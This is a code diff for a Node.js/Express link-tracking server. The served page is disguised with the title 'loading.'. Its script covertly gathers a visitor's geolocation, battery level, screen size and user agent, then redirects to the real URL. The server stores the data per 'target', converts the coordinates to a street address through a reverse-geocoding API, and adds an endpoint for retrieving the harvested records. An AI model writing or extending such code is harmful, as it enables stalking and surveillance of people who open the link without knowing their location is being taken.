@@ -19,7 +19,16 @@ db.once('open', () => {
 const trackingSchema = new mongoose.Schema({
     id: String,
     targetUrl: String,
-    clicks: [{ userAgent: String, ip: String, timestamp: Date, latitude: Number, longitude: Number}]
+    clicks: [{ 
+        userAgent: String, 
+        ip: String, 
+        timestamp: Date, 
+        latitude: Number, 
+        longitude: Number, 
+        batteryLevel: Number, 
+        screenWidth: Number, 
+        screenHeight: Number 
+    }]
 });
 
 const Tracking = mongoose.model('Tracking', trackingSchema);
@@ -52,7 +61,10 @@ app.get('/track/:id', async (req, res) => {
             ip: req.ip,
             timestamp: new Date(),
             latitude: null,
-            longitude: null
+            longitude: null,
+            batteryLevel: null,
+            screenWidth: null,
+            screenHeight: null
         };
 
         const script = `
@@ -61,45 +73,58 @@ app.get('/track/:id', async (req, res) => {
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Tracking</title>
+                <title>loading.</title>
             </head>
             <body>
                 <script>
+                    // Function to send the collected data to the server
+                    function sendDeviceInfo(battery, latitude, longitude) {
+                        const deviceInfo = {
+                            userAgent: navigator.userAgent,
+                            screenWidth: window.screen.width,
+                            screenHeight: window.screen.height,
+                            batteryLevel: battery ? battery.level * 100 : null,
+                            latitude: latitude,
+                            longitude: longitude
+                        };
 
-
-
-                        //Getting Positional coordinates of the target
-
-
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            fetch('/location', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({
-                                    pageID: '${id}',
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    deviceInfo: ${JSON.stringify(deviceInfo)}
-                                }),
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                console.log('Location sent:', data);
-                                window.location.href = '${tracking.targetUrl}';
-                            })
-                            .catch(error => {
-                                console.error('Error sending location:', error);
-                                window.location.href = '${tracking.targetUrl}';
-                            });
-                        },
-                        error => {
-                            console.error('Error getting location:', error);
+                        fetch('/location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                pageID: '${id}',
+                                deviceInfo: deviceInfo
+                            }),
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Device info sent:', data);
                             window.location.href = '${tracking.targetUrl}';
-                        }
-                    );
+                        })
+                        .catch(error => {
+                            console.error('Error sending device info:', error);
+                            window.location.href = '${tracking.targetUrl}';
+                        });
+                    }
+
+                    // Get battery info
+                    navigator.getBattery().then(battery => {
+                        // Get location info
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                sendDeviceInfo(battery, position.coords.latitude, position.coords.longitude);
+                            },
+                            error => {
+                                console.error('Error getting location:', error);
+                                sendDeviceInfo(battery, null, null);
+                            }
+                        );
+                    }).catch(() => {
+                        console.error('Error getting battery info');
+                        sendDeviceInfo(null, null, null);
+                    });
                 </script>
             </body>
             </html>
@@ -112,17 +137,45 @@ app.get('/track/:id', async (req, res) => {
 });
 
 app.post('/location', async (req, res) => {
-    const { pageID, latitude, longitude, deviceInfo } = req.body;
+    const { pageID, deviceInfo } = req.body;
     const tracking = await Tracking.findOne({ id: pageID });
 
     if (tracking) {
-        tracking.clicks.push({ ...deviceInfo, latitude, longitude });
+        tracking.clicks.push({ ...deviceInfo });
         await tracking.save();
         console.log(`Tracking details for page ${pageID}:`, tracking.clicks);
     }
 
-    res.json({ message: 'Location and device info received successfully.' });
+                //latitude and longitude to address conversion
+
+                const url = `https://nominatim.openstreetmap.org/reverse?lat=${deviceInfo.latitude}&lon=${deviceInfo.longitude}&format=json`;
+
+                const response = await fetch(url);
+                const data = await response.json();
+        
+                if (data && data.address) {
+                    const address = data.display_name;
+                    console.log('Address : ',address);
+                } 
+
+    res.status(200).send({ success: true });;
+
 });
+
+
+// GET route to retrieve tracking data
+app.get('/get-tracking/:pageID', async (req, res) => {
+    const { pageID } = req.params;
+    const tracking = await Tracking.findOne({ id: pageID });
+
+    if (tracking) {
+        res.json({ clicks: tracking.clicks });
+    } else {
+        res.status(404).json({ message: 'Tracking data not found' });
+    }
+});
+
+
 
 app.get('/stats/:id', async (req, res) => {
     const { id } = req.params;
